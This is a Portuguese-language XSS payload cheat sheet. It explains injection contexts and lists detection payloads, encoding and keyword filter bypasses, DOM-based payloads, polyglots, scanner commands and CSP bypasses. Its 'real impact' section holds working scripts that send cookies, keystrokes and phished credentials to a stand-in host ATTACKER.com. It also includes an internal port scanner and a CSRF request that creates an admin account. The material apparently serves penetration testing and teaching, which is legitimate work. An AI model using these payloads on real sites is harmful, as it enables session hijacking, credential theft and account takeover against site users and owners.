---
title: "XSS Payloads"
---

# XSS Payloads - Referência Rápida

## Por Que o Contexto de Injecao Determina o Payload

XSS nao e um payload unico — e uma classe de vulnerabilidade onde o payload correto depende fundamentalmente de *onde* o dado injetado aparece no HTML/JS gerado. O mesmo input pode ser inofensivo em um contexto e executavel em outro.

**Os quatro contextos de injecao e por que importam:**

| Contexto | Exemplo no HTML | Por que muda o payload |
|---|---|---|
| Entre tags HTML | `<p>INJECT</p>` | Qualquer tag funciona: `<script>`, `<img onerror>`, `<svg onload>` |
| Em atributo HTML | `<input value="INJECT">` | Precisa fechar o atributo: `" onmouseover="alert(1)` |
| Dentro de JavaScript | `var x = "INJECT";` | Pode injetar JS diretamente: `";alert(1)//` |
| Em href/src | `<a href="INJECT">` | JavaScript URI: `javascript:alert(1)` |

**Por que o mesmo payload pode ou nao funcionar:**

`<script>alert(1)</script>` nao funciona dentro de um atributo como `value="INJECT"`. O navegador ja parseou a tag — o conteudo do atributo nao e interpretado como HTML. Nesse contexto, o payload correto fecha o atributo e adiciona um handler de evento: `" onfocus="alert(1)" autofocus=`.

Da mesma forma, dentro de JavaScript (contexto `var x = "INJECT";`), nao e necessario usar tags HTML. A injecao e diretamente em JS: `";alert(1)//` fecha a string, executa o codigo, e comenta o resto.

**Implicacao para testes:**

Antes de escolher o payload, identificar o contexto: visualizar o codigo-fonte da pagina e procurar onde o input refletido aparece. Isso determina qual familia de payloads tentar primeiro.

---

## Payloads Básicos (Detecção)

```html
<!-- Clássicos para detecção inicial -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>confirm(1)</script>
<script>prompt(1)</script>

<!-- Quando script tags são filtradas -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

<!-- Sem aspas -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- JavaScript URI -->
javascript:alert(1)
javascript:alert(document.domain)
```

---

## Filter Bypass - Maiúsculas/Minúsculas

```html
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script>AleRt(1)</script>
<IMG SRC=X ONERROR=alert(1)>
<Img Src=X OnErRoR=alert(1)>
```

---

## Filter Bypass - Encoding

```html
<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E
%3Cimg+src%3Dx+onerror%3Dalert(1)%3E

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Unicode escape em JavaScript -->
<script>alert(1)</script>
<script>alert(1)</script>

<!-- Hex em JavaScript -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

<!-- Base64 em atob -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- Octal -->
<script>eval('\141\154\145\162\164\50\61\51')</script>
```

---

## Filter Bypass - Sem Palavras-Chave

```html
<!-- Quando 'alert' é filtrado -->
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>
<script>window['alert'](1)</script>
<script>self['alert'](1)</script>
<script>top['alert'](1)</script>
<script>this['alert'](1)</script>

<!-- Construção de string dinâmica -->
<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>
<script>window['al'+'ert'](1)</script>
<script>window['al\x65rt'](1)</script>

<!-- Quando 'script' é filtrado mas outros eventos não -->
<img src=x onerror=window.location='javascript:alert(1)'>
<body/onload=alert(1)>
<details/open/ontoggle=alert(1)>

-- Quando parênteses são filtrados
<script>alert`1`</script>
<script>alert`document.domain`</script>
<img src=x onerror="alert`1`">
```

---

## Filter Bypass - Sem Aspas

```html
<!-- Sem nenhuma aspas -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>

<!-- Quando valor deve estar em aspas mas = é filtrado -->
<img onerror="alert(1)" src="x">
```

---

## Contextos Específicos

### Dentro de Atributo HTML

```html
<!-- Contexto: <input value="INJECT" type="text"> -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" autofocus onfocus=alert(1) x="

<!-- Contexto: <input value='INJECT' type='text'> -->
'><script>alert(1)</script>
' onmouseover='alert(1)
```

### Dentro de JavaScript

```javascript
// Contexto: var x = "INJECT";
"-alert(1)-"
";alert(1)//
\";alert(1)//

// Contexto: var x = 'INJECT';
'-alert(1)-'
';alert(1)//
\';alert(1)//

// Contexto: var x = INJECT; (sem aspas)
1;alert(1)
1,alert(1)

// Contexto: em template literal var x = `INJECT`;
${alert(1)}
`-alert(1)-`
```

### Dentro de href/src

```html
<!-- Contexto: <a href="INJECT"> -->
javascript:alert(1)
javascript:alert(document.domain)
JaVaScRiPt:alert(1)
javascript&#58;alert(1)
javascript:void(0),alert(1)

<!-- Data URI -->
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Dentro de CSS

```html
<!-- Contexto: style="INJECT" -->
expression(alert(1))          <!-- IE8 e anterior -->
<style>body{background:url("javascript:alert(1)")}</style>
<link rel=stylesheet href="javascript:alert(1)">
```

---

## XSS em JSON/APIs

```json
// Quando resposta JSON é refletida sem escape
{"name": "<script>alert(1)</script>"}
{"name": "<img src=x onerror=alert(1)>"}
{"callback": "alert(1)"}     // JSONP callback injection
```

---

## Payloads de Impacto Real (Proof of Concept)

```javascript
// Roubo de cookie
<script>
fetch('https://ATTACKER.com/steal?c='+document.cookie)
</script>

// Usando img tag (sem fetch)
<img src=x onerror="this.src='https://ATTACKER.com/steal?c='+document.cookie">

// XSS com redirecionamento (para PoC simples)
<script>window.location='https://ATTACKER.com/?c='+document.cookie</script>

// Capturar credenciais (phishing via XSS)
<script>
document.body.innerHTML='<form action="https://ATTACKER.com/capture" method="post">'+
'<input name="user" placeholder="Username"><br>'+
'<input type="password" name="pass" placeholder="Password"><br>'+
'<button>Login</button></form>';
</script>

// Keylogger
<script>
document.onkeypress=function(e){
    fetch('https://ATTACKER.com/log?k='+e.key)
}
</script>

// CSRF via XSS (quando cookies são HttpOnly)
<script>
fetch('/api/admin/create-user', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({username:'hacker',password:'hacked',role:'admin'})
})
</script>

// Port scanning interno
<script>
for(var p of [22,80,443,8080,8443,3000,5000]){
    var img = new Image();
    img.onerror = (function(port){
        return function(){fetch('https://ATTACKER.com/?port='+port+'&status=closed')}
    })(p);
    img.onload = (function(port){
        return function(){fetch('https://ATTACKER.com/?port='+port+'&status=open')}
    })(p);
    img.src = 'http://127.0.0.1:'+p;
}
</script>

// XSS stored - payload que executa ao carregar página
<img src=x onerror="this.onerror=null;fetch('https://ATTACKER.com/'+document.cookie)">
```

---

## XSS em Cabeçalhos HTTP

```bash
# Quando User-Agent é refletido sem sanitização
curl -H "User-Agent: <script>alert(1)</script>" http://TARGET/

# Quando Referer é refletido
curl -H "Referer: <script>alert(1)</script>" http://TARGET/

# X-Forwarded-For em logs de auditoria
curl -H "X-Forwarded-For: <script>alert(1)</script>" http://TARGET/
```

---

## DOM-Based XSS

```javascript
// Fontes comuns de dados controlados pelo usuário
location.hash          // #payload
location.search        // ?q=payload
location.href          // URL completa
document.referrer      // Referer header
window.name            // Nome da janela

// Sinks perigosos (onde dado vai)
document.write(payload)
document.writeln(payload)
innerHTML = payload
outerHTML = payload
eval(payload)
setTimeout(payload)
setInterval(payload)
Function(payload)
location.href = payload
location.assign(payload)
location.replace(payload)
jQuery.html(payload)
$().append(payload)
$().prepend(payload)

// Payload para location.hash
http://TARGET/#<script>alert(1)</script>
http://TARGET/#"><img src=x onerror=alert(1)>
// Dentro de JS: #javascript:alert(1)

// Payload para document.write com hash
http://TARGET/page#<img src=x onerror=alert(1)>

// Quando dado é passado para eval via URL
http://TARGET/?code=alert(1)
http://TARGET/?callback=alert(1)
```

---

## Polyglot XSS (Funciona em Múltiplos Contextos)

```html
<!-- Polyglot clássico - funciona em atributo, HTML, JS -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Polyglot compacto -->
'"><svg/onload=alert(1)>

<!-- Para múltiplos contextos de aspas -->
\"><img src=x onerror=alert(1)>\
```

---

## Ferramentas

```bash
# XSStrike - scanner e fuzzer de XSS
pip3 install xsstrike
xsstrike -u "http://TARGET/?q=test"
xsstrike -u "http://TARGET/?q=test" --crawl   # Crawl + teste

# Dalfox - XSS finder rápido
go install github.com/hahwul/dalfox/v2@latest
dalfox url "http://TARGET/?q=test"
dalfox url "http://TARGET/?q=test" --cookie "session=abc"
cat urls.txt | dalfox pipe   # Input em massa

# BXSS (Blind XSS) - XSSHunter
# 1. Cadastrar em xsshunter.trufflesecurity.com
# 2. Payload gerado automaticamente, insere em campos
# 3. Notificação quando payload dispara

# Burp Suite - Active Scan para XSS
# Interceptar requisição -> Send to Scanner -> Active Scan
# Ou usar extensão XSS Validator

# Manual com curl
curl -s "http://TARGET/?q=<script>alert(1)</script>" | grep -i "alert"
curl -s "http://TARGET/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" | grep -i "alert"
```

---

## Content Security Policy (CSP) Bypass

```javascript
// Quando CSP permite 'unsafe-inline'
// Qualquer payload normal funciona

// Quando CSP permite CDN externo
<script src="https://cdn.jsdelivr.net/npm/angular@1.8/angular.min.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

// Quando CSP tem 'strict-dynamic'
<script nonce="NONCE-CORRETO">alert(1)</script>

// JSONP bypass (quando domínio JSONP está na allowlist)
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

// Angular sandbox escape (versões antigas)
{{constructor.constructor('alert(1)')()}}

// Verificar CSP de um site
curl -s -I http://TARGET | grep -i content-security
```
